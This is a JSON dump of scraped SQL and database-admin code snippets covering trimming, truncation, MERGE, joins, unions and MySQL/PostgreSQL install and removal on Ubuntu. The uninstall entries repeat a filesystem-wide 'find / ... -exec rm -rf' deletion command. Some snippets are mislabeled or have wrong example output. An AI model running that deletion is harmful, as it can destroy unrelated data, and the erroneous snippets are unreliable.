    "reg_date": "2021-10-12T10:01:16.000Z"
  },
  {
    "id": 4518,
    "keyword": null,
    "link": null,
    "title": " trim sql",
    "description": "SELECT TRIM('   Exemple   ');\t\t\t\t\t\t-- 'Exemple' SELECT LTRIM('   Exemple   ');\t\t\t\t\t\t-- 'Exemple   ' SELECT RTRIM('   Exemple   ');\t\t\t\t\t\t-- '   Exemple' SELECT TRIM(BOTH 'x' FROM 'xxxExemplexxx');\t\t\t-- 'Exemple' SELECT TRIM(LEADING 'x' FROM 'xxxExemplexxx');\t\t-- 'Exemplexxx' SELECT LTRIM('xxxExemplexxx', 'x');\t\t\t\t\t-- 'Exemplexxx' SELECT TRIM(TRAILING 'x' FROM 'xxxExemplexxx'); \t-- 'xxxExemple' SELECT RTRIM('xxxExemple', 'x');\t\t\t\t\t-- 'Exemplexxx'\nTRIM([LEADING | TRAILING | BOTH] [characters] FROM string)Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T10:01:16.000Z"
  },
  {
    "id": 4519,
    "keyword": null,
    "link": null,
    "title": " trim sql oracle",
    "description": "SELECT TRIM('   Exemple   ') FROM dual;\t\t\t\t\t\t-- 'Exemple' SELECT LTRIM('   Exemple   ') FROM dual;\t\t\t\t\t-- 'Exemple   ' SELECT RTRIM('   Exemple   ') FROM dual;\t\t\t\t\t-- '   Exemple' SELECT TRIM(BOTH 'x' FROM 'xxxExemplexxx') FROM dual;\t\t-- 'Exemple' SELECT TRIM(LEADING 'x' FROM 'xxxExemplexxx') FROM dual;\t-- 'Exemplexxx' SELECT LTRIM('xxxExemplexxx', 'x') FROM dual;\t\t\t\t-- 'Exemplexxx' SELECT TRIM(TRAILING 'x' FROM 'xxxExemplexxx') FROM dual; \t-- 'xxxExemple' SELECT RTRIM('xxxExemple', 'x') FROM dual;\t\t\t\t\t-- 'Exemplexxx'\n",
    "reg_date": "2021-10-12T10:01:16.000Z"
  },
  {
    "id": 4520,
    "keyword": null,
    "link": null,
    "title": " trunc sql",
    "description": "SELECT TRUNC(TO_DATE('27-OCT-92','DD-MON-YY'), 'YEAR')   \"New Year\" FROM DUAL;   New Year --------- 01-JAN-92  \n-- trunc(date, format)\t\t\t\t\t\tDUAL is for Oracle SELECT trunc(sysdate) FROM DUAL;            -- today 00:00:00 SELECT trunc(sysdate, 'Q') FROM DUAL;       -- 1rst quarter day SELECT trunc(sysdate, 'YEAR') FROM DUAL;    -- 1rst year day SELECT trunc(sysdate, 'MONTH') FROM DUAL;   -- 1rst month day\nTRUNC function returns a date truncated to a specific unit of measure. TRUNC function returns a date truncated to a specific unit of measure.\n",
    "reg_date": "2021-10-12T10:01:17.000Z"
  },
  {
    "id": 4521,
    "keyword": null,
    "link": null,
    "title": " truncate all tables",
    "description": "TRUNCATE TABLE table;\nSELECT Concat('TRUNCATE TABLE ',table_schema,'.',TABLE_NAME, ';')  FROM INFORMATION_SCHEMA.TABLES where  table_schema in ('db1_name','db2_name');\n",
    "reg_date": "2021-10-12T10:01:17.000Z"
  },
  {
    "id": 4522,
    "keyword": null,
    "link": null,
    "title": " truncate delete and drop in sql",
    "description": "DELETE - -DML COMMAND -Delete Rows from the table one by one -We can use where clause with Delete to delete single row -Delete is slower than truncate -ROLLBACK is possible with DELETE  DROP- -DDL COMMAND -Delete the entire structure or schema -We can't use where clause with drop -Drop is slower than DELETE & TRUNCATE -ROLLBACK IS NOT POSSIBLE WITH DROP  TRUNCATE- -DDL COMMAND -Truncate deletes rows at a one goal -We can't use where clause with Truncate -Truncate faster than both DELETE & DROP -Rollback is not possible with Truncate \nDELETE - -DML COMMAND -Delete Rows from the table one by one -We can use where clause with Delete to delete single row -Delete is slower than truncate -ROLLBACK is possible with DELETE  DROP- -DDL COMMAND -Delete the entire structure or schema -We can't use where clause with drop -Drop is slower than DELETE & TRUNCATE -ROLLBACK IS NOT POSSIBLE WITH DROP  TRUNCATE- -DDL COMMAND -Truncate deletes rows at a one goal -We can't use where clause with Truncate -Truncate faster than both DELETE & DROP -Rollback is not possible with Truncate\n",
    "reg_date": "2021-10-12T10:01:17.000Z"
  },
  {
    "id": 4523,
    "keyword": null,
    "link": null,
    "title": " truncate left characters mysql",
    "description": "SELECT TRIM(LEADING '0' FROM phone_number ); \n",
    "reg_date": "2021-10-12T10:01:17.000Z"
  },
  {
    "id": 4524,
    "keyword": null,
    "link": null,
    "title": " truncate oracle",
    "description": "-- Quick, no possible rollback TRUNCATE TABLE my_table; -- With rollback DELETE FROM my_table; COMMIT;\nTRUNCATE TABLE tablename\n",
    "reg_date": "2021-10-12T10:01:17.000Z"
  },
  {
    "id": 4525,
    "keyword": null,
    "link": null,
    "title": " truncate table",
    "description": "TRUNCATE TABLE `fourniture`\nTRUNCATE TABLE  table_name; \nTRUNCATE TABLE table;\nSELECT Concat('TRUNCATE TABLE ',table_schema,'.',TABLE_NAME, ';')  FROM INFORMATION_SCHEMA.TABLES where  table_schema in ('db1_name','db2_name');\n",
    "reg_date": "2021-10-12T10:01:17.000Z"
  },
  {
    "id": 4526,
    "keyword": null,
    "link": null,
    "title": " truncate table mysql",
    "description": "TRUNCATE TABLE `fourniture`\n-- If you do not need a condition or limit the rows: TRUNCATE TABLE tblYourTable; -- Not Foreign key constrained  -- Or  SET FOREIGN_KEY_CHECKS = 0;  TRUNCATE YourTable1; TRUNCATE YourTable2;  SET FOREIGN_KEY_CHECKS = 1;  -- -------------------------------------------------------- -- Otherwise: DELETE FROM tblYourTable WHERE condition;  -- Or  DELETE FROM tblYourTable LIMIT row_count;\nDELETE FROM mytest.instance; ALTER TABLE mytest.instance AUTO_INCREMENT = 1;\n",
    "reg_date": "2021-10-12T10:01:17.000Z"
  },
  {
    "id": 4527,
    "keyword": null,
    "link": null,
    "title": " truncate table sqlite",
    "description": "The TRUNCATE TABLE statement is used to remove all records from a table.  SQLite does not have an explicit TRUNCATE TABLE command like other databases. Instead, it has added a TRUNCATE optimizer to the DELETE statement. To truncate a table in SQLite, you just need to execute a DELETE statement without a WHERE clause. The TRUNCATE optimizer handles the rest. Let's explain.  Normally, when you execute a DELETE statement, the database must visit each row in the table to perform the deletion. In SQLite, when you execute a DELETE statement without a WHERE clause, the TRUNCATE optimizer is run instead of the normal delete behavior. The TRUNCATE optimizer removes all data from the table without the need to visit each row in the table. This is much faster than a normal delete operation.\nDELETE FROM suppliers;\n",
    "reg_date": "2021-10-12T10:01:17.000Z"
  },
  {
    "id": 4528,
    "keyword": null,
    "link": null,
    "title": " tsql array parameter",
    "description": "SELECT ProductId, Name, Tags   FROM Product   WHERE 'clothing' IN (SELECT value FROM STRING_SPLIT(Tags, ',')); \nCREATE TYPE dbo.IDList AS TABLE (   ID INT ); GO  CREATE PROCEDURE dbo.DoSomethingWithEmployees   @List AS dbo.IDList READONLY AS BEGIN   SET NOCOUNT ON;    SELECT ID FROM @List;  END GO\nCREATE FUNCTION dbo.SplitInts (    @List      VARCHAR(MAX),    @Delimiter VARCHAR(255) ) RETURNS TABLE AS   RETURN ( SELECT Item = CONVERT(INT, Item) FROM       ( SELECT Item = x.i.value('(./text())[1]', 'varchar(max)')         FROM ( SELECT [XML] = CONVERT(XML, '<i>'         + REPLACE(@List, @Delimiter, '</i><i>') + '</i>').query('.')           ) AS a CROSS APPLY [XML].nodes('i') AS x(i) ) AS y       WHERE Item IS NOT NULL   ); GO\n",
    "reg_date": "2021-10-12T10:01:17.000Z"
  },
  {
    "id": 4529,
    "keyword": null,
    "link": null,
    "title": " tsql case when",
    "description": "-- NOTE: this is for SQL-Oracle specifically  /* NB: Please like Mingles444 post, I derived this from him/her */  -- syntax: (Retrieved from grepper:Mingles444) CASE     WHEN condition1 THEN result1     WHEN condition2 THEN result2     WHEN conditionN THEN resultN     ELSE result END   -- example: SELECT  \tCASE       WHEN (1+6 = 6) THEN 'A'       WHEN (1+6 = 7) THEN 'B'       WHEN (1+6 = 8) THEN 'C'       ELSE 'D' \tEND  FROM DUAL;  -- OUTPUT: B \n-- Syntax for SQL Server, Azure SQL Database and Azure Synapse Analytics    --Simple CASE expression:    CASE input_expression         WHEN when_expression THEN result_expression [ ...n ]         [ ELSE else_result_expression ]    END     --Searched CASE expression:   CASE        WHEN Boolean_expression THEN result_expression [ ...n ]         [ ELSE else_result_expression ]    END   \n/*CASE statements are used to create different outputs and is    used by SQL as a way to handle if-then logic.*/      SELECT column_name,     CASE        WHEN condition THEN 'Result_1'       WHEN condition THEN 'Result_2'       ELSE 'Result_3'     END   FROM table_name;\n",
    "reg_date": "2021-10-12T10:01:17.000Z"
  },
  {
    "id": 4530,
    "keyword": null,
    "link": null,
    "title": " tsql cmd exec script from file",
    "description": "#Integrated Security sqlcmd -S Serverinstance -E -i import_file.sql #UserName and Password sqlcmd -S <server Name> -U sa -P sapassword -i inputquery_file_name -o outputfile_name \n",
    "reg_date": "2021-10-12T10:01:18.000Z"
  },
  {
    "id": 4531,
    "keyword": null,
    "link": null,
    "title": " tsql copy table",
    "description": "SELECT * INTO MyTableBackup FROM MyTable;\n",
    "reg_date": "2021-10-12T10:01:18.000Z"
  },
  {
    "id": 4532,
    "keyword": null,
    "link": null,
    "title": " tsql create  temp table",
    "description": "CREATE TABLE #haro_products (     product_name VARCHAR(MAX),     list_price DEC(10,2) );\n",
    "reg_date": "2021-10-12T10:01:18.000Z"
  },
  {
    "id": 4533,
    "keyword": null,
    "link": null,
    "title": " tsql delete all rows",
    "description": "Delete From <TableName> \n",
    "reg_date": "2021-10-12T10:01:18.000Z"
  },
  {
    "id": 4534,
    "keyword": null,
    "link": null,
    "title": " tsql find foreign key references",
    "description": "EXEC sp_fkeys 'TableName'\n",
    "reg_date": "2021-10-12T10:01:18.000Z"
  },
  {
    "id": 4535,
    "keyword": null,
    "link": null,
    "title": " tsql get beginning of year",
    "description": "SELECT    DATEADD(yy, DATEDIFF(yy, 0, GETDATE()), 0) AS StartOfYear,    DATEADD(yy, DATEDIFF(yy, 0, GETDATE()) + 1, -1) AS EndOfYear\n",
    "reg_date": "2021-10-12T10:01:18.000Z"
  },
  {
    "id": 4536,
    "keyword": null,
    "link": null,
    "title": " tsql goup by clause in merge statement",
    "description": "MERGE dbo.MyTarget targ USING (SELECT ... FROM dbo.MySource GROUP BY .....) src ON (targ.Identifier = src.Identifier     AND targ.Name = src.ConstituentName     AND targ.Ticker = src.ConstituentTicker     AND (targ.CUSIP = src.CUSIP OR targ.ISIN = src.ISIN OR targ.SEDOL = src.SEDOL)) WHEN MATCHED THEN -- update values ;\n",
    "reg_date": "2021-10-12T10:01:18.000Z"
  },
  {
    "id": 4537,
    "keyword": null,
    "link": null,
    "title": " tsql join multiple record in one string",
    "description": "-- Concatenates results into one single varchar with separator SELECT LISTAGG(column_name, ',') WITHIN GROUP (ORDER BY column_name) FROM YOUR_TABLE;\nSelect CountryName from Application.Countries    Declare @val Varchar(MAX);  Select @val = COALESCE(@val + ', ' + CountryName, CountryName)          From Application.Countries Select @val; \n",
    "reg_date": "2021-10-12T10:01:18.000Z"
  },
  {
    "id": 4538,
    "keyword": null,
    "link": null,
    "title": " tsql merge example",
    "description": "MERGE esqlProductTarget T USING esqlProductSource S ON (S.ProductID = T.ProductID) WHEN MATCHED       THEN UPDATE      SET    T.Name = S.Name,             T.ProductNumber = S.ProductNumber,             T.Color = S.Color WHEN NOT MATCHED BY TARGET THEN INSERT (ProductID, Name, ProductNumber, Color)      VALUES (S.ProductID, S.Name, S.ProductNumber, S.Color) WHEN NOT MATCHED BY SOURCE THEN DELETE;\nMERGE dbo.MyTarget targ USING (SELECT ... FROM dbo.MySource GROUP BY .....) src ON (targ.Identifier = src.Identifier     AND targ.Name = src.ConstituentName     AND targ.Ticker = src.ConstituentTicker     AND (targ.CUSIP = src.CUSIP OR targ.ISIN = src.ISIN OR targ.SEDOL = src.SEDOL)) WHEN MATCHED THEN -- update values ;\n                                     MERGE sales.category t      USING sales.category_staging s ON (s.category_id = t.category_id) WHEN MATCHED     THEN UPDATE SET          t.category_name = s.category_name,         t.amount = s.amount WHEN NOT MATCHED BY TARGET      THEN INSERT (category_id, category_name, amount)          VALUES (s.category_id, s.category_name, s.amount) WHEN NOT MATCHED BY SOURCE      THEN DELETE; \nMERGE table1 USING (SELECT table3.keycolumn,               table2.DataColumn1,               table2.DataColumn2        FROM table2        INNER JOIN table3            ON table2.anotherKey = table3.anotherKey        WHERE table2.anotherKey = 'A1') tmpTable ON     table1.keyColumn = tmpTable.keyColumn WHEN MATCHED THEN        UPDATE        SET table1.DataColumn1 = tmpTable.DataColumn1             ,table1.DataColumn2 = tmpTable.DataColumn2;\n",
    "reg_date": "2021-10-12T10:01:18.000Z"
  },
  {
    "id": 4539,
    "keyword": null,
    "link": null,
    "title": " tsql pad left",
    "description": "declare @T table(id int) insert into @T values (1), (2), (12), (123), (1234)  select right('0000'+convert(varchar(4), id), 4) from @T\n",
    "reg_date": "2021-10-12T10:01:18.000Z"
  },
  {
    "id": 4540,
    "keyword": null,
    "link": null,
    "title": " tsql print triangle",
    "description": "-- generate a guid table ;with guids( i, guid ) as (     select 1 as i, newid()         union all     select i + 1, newid()         from guids         where i < 20 )  -- print triangle   select replicate('* ', i)     from guids  order by i asc option (maxrecursion 30)  -- print triangle inverted manner select replicate('* ', i)     from guids  order by i desc\n",
    "reg_date": "2021-10-12T10:01:19.000Z"
  },
  {
    "id": 4541,
    "keyword": null,
    "link": null,
    "title": " tsql random number",
    "description": "SELECT FLOOR(RAND()*(b-a+1))+a;\n",
    "reg_date": "2021-10-12T10:01:19.000Z"
  },
  {
    "id": 4542,
    "keyword": null,
    "link": null,
    "title": " tsql replace value in json",
    "description": "UPDATE MyTable set MyValue = REPLACE(value, 'OldValue', 'NewValue') WHERE MyValue LIKE '%OldValue%'\n",
    "reg_date": "2021-10-12T10:01:19.000Z"
  },
  {
    "id": 4543,
    "keyword": null,
    "link": null,
    "title": " tsql reseed identity",
    "description": "USE AdventureWorks2012;   GO   DBCC CHECKIDENT ('Person.AddressType', RESEED, 10);   GO   \n",
    "reg_date": "2021-10-12T10:01:19.000Z"
  },
  {
    "id": 4544,
    "keyword": null,
    "link": null,
    "title": " tsql row number",
    "description": "SELECT     ROW_NUMBER() OVER (  ORDER BY first_name    ) row_num,    first_name,     last_name,     city FROM     sales.customers; \n                                     SELECT     ROW_NUMBER() OVER ( \tORDER BY first_name    ) row_num,    first_name,     last_name,     city FROM     sales.customers;\nUSE AdventureWorks2012;   GO   WITH OrderedOrders AS   (       SELECT SalesOrderID, OrderDate,       ROW_NUMBER() OVER (ORDER BY OrderDate) AS RowNumber       FROM Sales.SalesOrderHeader    )    SELECT SalesOrderID, OrderDate, RowNumber     FROM OrderedOrders    WHERE RowNumber BETWEEN 50 AND 60;   \n",
    "reg_date": "2021-10-12T10:01:19.000Z"
  },
  {
    "id": 4545,
    "keyword": null,
    "link": null,
    "title": " turn off safe mode mysql",
    "description": "SET SQL_SAFE_UPDATES = 0;\nSET SQL_SAFE_UPDATES = 0; \n",
    "reg_date": "2021-10-12T10:01:19.000Z"
  },
  {
    "id": 4546,
    "keyword": null,
    "link": null,
    "title": " turn on foreign keys check mysql",
    "description": "SET FOREIGN_KEY_CHECKS=0;\n",
    "reg_date": "2021-10-12T10:01:19.000Z"
  },
  {
    "id": 4547,
    "keyword": null,
    "link": null,
    "title": " two inner joins",
    "description": "SELECT    c.*, i.*, a.*  FROM    invoices i  INNER JOIN    client c  ON    i.clientid = c.clientid  INNER JOIN    address a  ON    a.clientid = c.clientid  WHERE    i.id = 21 \n",
    "reg_date": "2021-10-12T10:01:19.000Z"
  },
  {
    "id": 4548,
    "keyword": null,
    "link": null,
    "title": " typeorm postgresql",
    "description": "npm i &mdash; save @nestjs/typeorm typeorm pg\n",
    "reg_date": "2021-10-12T10:01:19.000Z"
  },
  {
    "id": 4549,
    "keyword": null,
    "link": null,
    "title": " typeorm raw sql",
    "description": "const rawData = await manager.query(`SELECT * FROM USERS`);\n",
    "reg_date": "2021-10-12T10:01:19.000Z"
  },
  {
    "id": 4550,
    "keyword": null,
    "link": null,
    "title": " types of joins in mysql",
    "description": "SELECT      m.member_id,      m.name member,      c.committee_id,      c.name committee FROM     members m INNER JOIN committees c  \tON c.name = m.name;\nJoins are used with select statement. it is used to select data from multiple table. Types: MySQL INNER JOIN (or simple join) MySQL LEFT OUTER JOIN (or LEFT JOIN) MySQL RIGHT OUTER JOIN (or RIGHT JOIN)  Inner JOIN : The INNER JOIN is used to return all rows from multiple tables where the join condition is satisfied. It is the most common type of join.  Left Outer Join: The LEFT OUTER JOIN returns all rows from the left hand table specified in the ON condition and only those rows from the other table where the join condition is fulfilled.  Right Outer Join: The Right Outer Join returns all rows from the RIGHT-hand table specified in the ON condition and only those rows from the other table where he join condition is fulfilled.\n",
    "reg_date": "2021-10-12T10:01:20.000Z"
  },
  {
    "id": 4551,
    "keyword": null,
    "link": null,
    "title": " ubuntu access database from terminal",
    "description": "mysql -u USERNAME -p\n",
    "reg_date": "2021-10-12T10:01:20.000Z"
  },
  {
    "id": 4552,
    "keyword": null,
    "link": null,
    "title": " ubuntu connect to mssql database",
    "description": "// if u use sql cli   https://github.com/dbcli/mssql-cli //conect to server mssql-cli -S <server URL> -d <database name> -U <username> -P <password>  //select the version from the server Select @@version\n",
    "reg_date": "2021-10-12T10:01:20.000Z"
  },
  {
    "id": 4553,
    "keyword": null,
    "link": null,
    "title": " ubuntu install mysql 5.7",
    "description": "Installing MySQL 5.7 on Ubuntu 20.04 (Focal Fossa) Step 1: Add MySQL APT repository in Ubuntu. ... Step 2: Update MySQL Repository on Ubuntu. ... Step 3: Install MySQL 5.7 on Ubuntu 20.04 Linux machine. ... Step 3: Secure MySQL 5.7 Installation on Ubuntu 20.04. ... Check MySQL version. ... Step 4: Create MySQL User (Optional, testing only)\n",
    "reg_date": "2021-10-12T10:01:20.000Z"
  },
  {
    "id": 4554,
    "keyword": null,
    "link": null,
    "title": " ubuntu install mysql 8.0",
    "description": "wget -c https://dev.mysql.com/get/mysql-apt-config_0.8.11-1_all.deb\n",
    "reg_date": "2021-10-12T10:01:20.000Z"
  },
  {
    "id": 4555,
    "keyword": null,
    "link": null,
    "title": " ubuntu install postgresql 12",
    "description": "sudo sh -c 'echo \"deb http://apt.postgresql.org/pub/repos/apt $(lsb_release -cs)-pgdg main\" > /etc/apt/sources.list.d/pgdg.list' wget --quiet -O - https://www.postgresql.org/media/keys/ACCC4CF8.asc | sudo apt-key add - sudo apt-get update sudo apt-get -y install postgresql\n",
    "reg_date": "2021-10-12T10:01:20.000Z"
  },
  {
    "id": 4556,
    "keyword": null,
    "link": null,
    "title": " ubuntu reset mysql root password",
    "description": "Set / change / reset the MySQL root password on Ubuntu Linux. Enter the following lines in your terminal.  Stop the MySQL Server: sudo /etc/init.d/mysql stop Start the mysqld configuration: sudo mysqld --skip-grant-tables &  In some cases, you've to create the /var/run/mysqld first:  sudo mkdir -v /var/run/mysqld && sudo chown mysql /var/run/mysqld Run: sudo service mysql start Login to MySQL as root: mysql -u root mysql Replace YOURNEWPASSWORD with your new password:  UPDATE   mysql.user SET   Password = PASSWORD('YOURNEWPASSWORD') WHERE   User = 'root'; FLUSH PRIVILEGES; exit; Note: on some versions, if password column doesn't exist, you may want to try: UPDATE user SET authentication_string=password('YOURNEWPASSWORD') WHERE user='root';  Note: This method is not regarded as the most secure way of resetting the password, however, it works.\nALTER USER 'root'@'localhost' IDENTIFIED BY 'my_password';\n",
    "reg_date": "2021-10-12T10:01:20.000Z"
  },
  {
    "id": 4557,
    "keyword": null,
    "link": null,
    "title": " ubuntu stop mysql",
    "description": "service mysqld status service mysqld stop service mysqld start  \nsudo service mysql-server\nservice mysql status service mysql stop service mysql start \nsudo systemctl disable mysql \nsudo /etc/init.d/mysql stop \nsudo stop mysql # The service must be running \n",
    "reg_date": "2021-10-12T10:01:20.000Z"
  },
  {
    "id": 4558,
    "keyword": null,
    "link": null,
    "title": " ubuntu stop mysql from starting on boot",
    "description": "sudo systemctl disable mysql \n",
    "reg_date": "2021-10-12T10:01:20.000Z"
  },
  {
    "id": 4559,
    "keyword": null,
    "link": null,
    "title": " unable to convert mysql date/time value to system.datetime",
    "description": "If I google for \"Unable to convert MySQL date/time value to System.DateTime\" I see numerous references to a problem accessing MySQL from Visual Studio. Is that your context?  One solution suggested is:  This is not a bug but expected behavior. Please check manual under connect options and set \"Allow Zero Datetime\" to true, as on attached pictures, and the error will go away.  Reference: http://bugs.mysql.com/bug.php?id=26054\n",
    "reg_date": "2021-10-12T10:01:20.000Z"
  },
  {
    "id": 4560,
    "keyword": null,
    "link": null,
    "title": " uninstall mysql on ubuntu",
    "description": "$ sudo apt-get remove --purge mysql-server mysql-client mysql-common -y $ sudo apt-get autoremove -y $ sudo apt-get autoclean $ sudo rm -rf /etc/mysql # Delete all MySQL files on your server:  $ sudo find / -iname 'mysql*' -exec rm -rf {} \\;\n$ sudo apt purge mysql-server* \nsudo systemctl stop mysql  sudo apt-get purge mysql-server mysql-client mysql-common mysql-server-core-* mysql-client-core-*  sudo rm -rf /etc/mysql /var/lib/mysql\napt-get --purge remove \"mysql*\"\n",
    "reg_date": "2021-10-12T10:01:21.000Z"
  },
  {
    "id": 4561,
    "keyword": null,
    "link": null,
    "title": " uninstall mysql ubuntu",
    "description": "$ sudo apt-get remove --purge mysql-server mysql-client mysql-common -y $ sudo apt-get autoremove -y $ sudo apt-get autoclean $ sudo rm -rf /etc/mysql # Delete all MySQL files on your server:  $ sudo find / -iname 'mysql*' -exec rm -rf {} \\;\n$ sudo apt purge mysql-server* \nsudo systemctl stop mysql  sudo apt-get purge mysql-server mysql-client mysql-common mysql-server-core-* mysql-client-core-*  sudo rm -rf /etc/mysql /var/lib/mysql\nsudo apt-get remove --purge mysql* -y sudo apt-get autoremove -y sudo apt-get autoclean\napt-get --purge remove \"mysql*\"\n",
    "reg_date": "2021-10-12T10:01:21.000Z"
  },
  {
    "id": 4562,
    "keyword": null,
    "link": null,
    "title": " uninstall mysql ubuntu 18.04",
    "description": "$ sudo apt-get remove --purge mysql-server mysql-client mysql-common -y $ sudo apt-get autoremove -y $ sudo apt-get autoclean $ sudo rm -rf /etc/mysql # Delete all MySQL files on your server:  $ sudo find / -iname 'mysql*' -exec rm -rf {} \\;\n$ sudo apt purge mysql-server* \nsudo systemctl stop mysql  sudo apt-get purge mysql-server mysql-client mysql-common mysql-server-core-* mysql-client-core-*  sudo rm -rf /etc/mysql /var/lib/mysql\napt-get --purge remove \"mysql*\"\n",
    "reg_date": "2021-10-12T10:01:21.000Z"
  },
  {
    "id": 4563,
    "keyword": null,
    "link": null,
    "title": " uninstall postgresql mac",
    "description": "$ brew remove postgresql \n/Library/PostgreSQL/10 open uninstall-postgres.app\n",
    "reg_date": "2021-10-12T10:01:21.000Z"
  },
  {
    "id": 4564,
    "keyword": null,
    "link": null,
    "title": " union all",
    "description": "  SELECT City FROM Customers UNION ALL SELECT City FROM Suppliers   ORDER BY City;  \n  SELECT City FROM Customers UNION SELECT City FROM Suppliers ORDER BY City;  \n",
    "reg_date": "2021-10-12T10:01:21.000Z"
  },
  {
    "id": 4565,
    "keyword": null,
    "link": null,
    "title": " union all in mysql",
    "description": "SELECT supplier_id, supplier_name FROM suppliers WHERE supplier_id <= 500 UNION SELECT company_id, company_name FROM companies WHERE company_name = 'Apple' ORDER BY 2;\nSELECT expression1, expression2, ... expression_n FROM tables [WHERE conditions] UNION ALL SELECT expression1, expression2, ... expression_n FROM tables [WHERE conditions];\n  SELECT City FROM Customers UNION ALL SELECT City FROM Suppliers   ORDER BY City;  \n",
    "reg_date": "2021-10-12T10:01:21.000Z"
  },
  {
    "id": 4566,
    "keyword": null,
    "link": null,
    "title": " union and union all in sql server",
    "description": "SELECT expression1, expression2, ... expression_n FROM tables [WHERE conditions] UNION ALL SELECT expression1, expression2, ... expression_n FROM tables [WHERE conditions];\n/* UNION AND UNION ALL*/ union and union all operator in sql server are used to combine the result-set of two or more select queries. union remove duplicate rows, where as union all doesn't. .e.g_ SELECT Column_List from Table_Name UNION SELECT Column_List from Table_Name /--------------------------------------------/ .e.g_ SELECT Column_List from Table_Name UNION ALL  SELECT Column_List from Table_Name  /* UNION AND JOIN */ Union combine rows from 2 or more tables, where as  join combine columns from 2 or more tables. \nUNION ALL: COMBINES THE RESULT OF 2 QUERY AND DOESN'T REMOVE DUPLICATE ROWS AND DOESN'T SORT BY FIRST COLUMN  UNION: COMBINES THE RESULT OF 2 QUERY AND REMOVES DUPLICATE ROWS AND SORTS BY FIRST COLUMN \nUNION ALL: COMBINES THE RESULT OF 2 QUERY AND DOESN'T REMOVE DUPLICATE ROWS AND DOESN'T SORT BY FIRST COLUMN \n",
    "reg_date": "2021-10-12T10:01:21.000Z"
  },
  {
    "id": 4567,
    "keyword": null,
    "link": null,
    "title": " union vs union all in sql",
    "description": "UNION ALL: COMBINES THE RESULT OF 2 QUERY AND DOESN'T REMOVE DUPLICATE ROWS AND DOESN'T SORT BY FIRST COLUMN  UNION: COMBINES THE RESULT OF 2 QUERY AND REMOVES DUPLICATE ROWS AND SORTS BY FIRST COLUMN  \nSELECT expression1, expression2, ... expression_n FROM tables [WHERE conditions] UNION ALL SELECT expression1, expression2, ... expression_n FROM tables [WHERE conditions];\nCombines the results from 2 or more SELECT statements and returns only distinct values. Example: Returns the cities from the events and subscribers tables. SELECT city FROM events UNION SELECT city from subscribers;\n/* UNION AND UNION ALL*/ union and union all operator in sql server are used to combine the result-set of two or more select queries. union remove duplicate rows, where as union all doesn't. .e.g_ SELECT Column_List from Table_Name UNION SELECT Column_List from Table_Name /--------------------------------------------/ .e.g_ SELECT Column_List from Table_Name UNION ALL  SELECT Column_List from Table_Name  /* UNION AND JOIN */ Union combine rows from 2 or more tables, where as  join combine columns from 2 or more tables. \nUNION ALL: COMBINES THE RESULT OF 2 QUERY AND DOESN'T REMOVE DUPLICATE ROWS AND DOESN'T SORT BY FIRST COLUMN  UNION: COMBINES THE RESULT OF 2 QUERY AND REMOVES DUPLICATE ROWS AND SORTS BY FIRST COLUMN \nUNION ALL: COMBINES THE RESULT OF 2 QUERY AND DOESN'T REMOVE DUPLICATE ROWS AND DOESN'T SORT BY FIRST COLUMN \n",
    "reg_date": "2021-10-12T10:01:21.000Z"
  },
  {
    "id": 4568,
    "keyword": null,
    "link": null,
    "title": " unique constraint mssql",
    "description": "ALTER TABLE table_name ADD CONSTRAINT cst_name UNIQUE (col_name);  ALTER TABLE table_name ADD CONSTRAINT cst_name UNIQUE (col1, col2); -- Multiple ALTER TABLE table_name ADD col_name NUMBER UNIQUE;\t\t\t\t  \t-- New field\nUSE AdventureWorks2012;   GO   CREATE TABLE Production.TransactionHistoryArchive4    (      TransactionID int NOT NULL,       CONSTRAINT AK_TransactionID UNIQUE(TransactionID)    );    GO    \n",
    "reg_date": "2021-10-12T10:01:21.000Z"
  },
  {
    "id": 4569,
    "keyword": null,
    "link": null,
    "title": " unique element in sql",
    "description": "SELECT DISTINCT column1, column1, ..... FROM TABLE /*DISTINCT WILL NOT SELECT THE SAME VALUES IN SAME COLUMN*/\nDistinct: helps to displays the non duplicate records when retrieving the records from a table.  SELECT DISTINCT FIRST_NAME FROM VISITORS;\nDISTINCT - select distinct * from employees; ==> retrieves any row if it has at least a single unique column. - select distinct first_name from employees; ==> retrieves unique names from table. (removes duplicates) - select distinct count(*) from employees; retrieve number of unique rows if any row has at least a single unique data.\n",
    "reg_date": "2021-10-12T10:01:21.000Z"
  },
  {
    "id": 4570,
    "keyword": null,
    "link": null,
    "title": " unique key in ms sql server",
    "description": "/* To create the Unique Key. Unique Key constraint to enforce uniqueneess of a column i.e. the column  shouldn't allow duplicate values.*/ ALTER TABLE Table_Name ADD CONSTRAINT Constraint_Name UNIQUE (Column_Name)\n",
    "reg_date": "2021-10-12T10:01:22.000Z"
  },
  {
    "id": 4571,
    "keyword": null,
    "link": null,
    "title": " unique vs primary key",
    "description": "What is the difference between UNIQUE and PRIMARY KEY constraints?  There should be only one PRIMARY KEY  in a table whereas there can be any number of UNIQUE Keys. PRIMARY KEY doesn&rsquo;t allow NULL values whereas Unique key allows NULL values. \nWhat is the difference between UNIQUE and PRIMARY KEY constraints?  There should be only one PRIMARY KEY  in a table whereas there can be any number of UNIQUE Keys. PRIMARY KEY doesn&rsquo;t allow NULL values whereas Unique key allows NULL values.\n",
    "reg_date": "2021-10-12T10:01:22.000Z"
  },
  {
    "id": 4572,
    "keyword": null,
    "link": null,
    "title": " unsigned int in mysql",
    "description": "id INT(10) UNSIGNED NOT NULL AUTO_INCREMENT\n",
    "reg_date": "2021-10-12T10:01:22.000Z"
  },
  {
    "id": 4573,
    "keyword": null,
    "link": null,
    "title": " update after insert sql",
    "description": "-- SQL Server (update my_table2 after insert on my_table1) CREATE TRIGGER trigger_name ON my_table1 FOR INSERT AS BEGIN     UPDATE my_table2 SET my_col_date = getdate() FROM my_table1  END -- Oracle (insert into log table after update on my_table) CREATE OR REPLACE TRIGGER trigger_name AFTER INSERT ON my_table FOR EACH ROW BEGIN     INSERT INTO my_log_table (LOG_DATE, ACTION) VALUES (SYSDATE, 'Changed'); END;\n",
    "reg_date": "2021-10-12T10:01:22.000Z"
  },
  {
    "id": 4574,
    "keyword": null,
    "link": null,
    "title": " update all rows mysql",
    "description": "UPDATE tableName SET columnName = yourValue; #to update multiple columns: UPDATE tableName SET column1 = value1, column2 = value2; #and so on\nmysql> UPDATE tableName SET sometotal = sometotal+10 WHERE Id = 4;\n",
    "reg_date": "2021-10-12T10:01:22.000Z"
  },
  {
    "id": 4575,
    "keyword": null,
    "link": null,
    "title": " update and replace mysql",
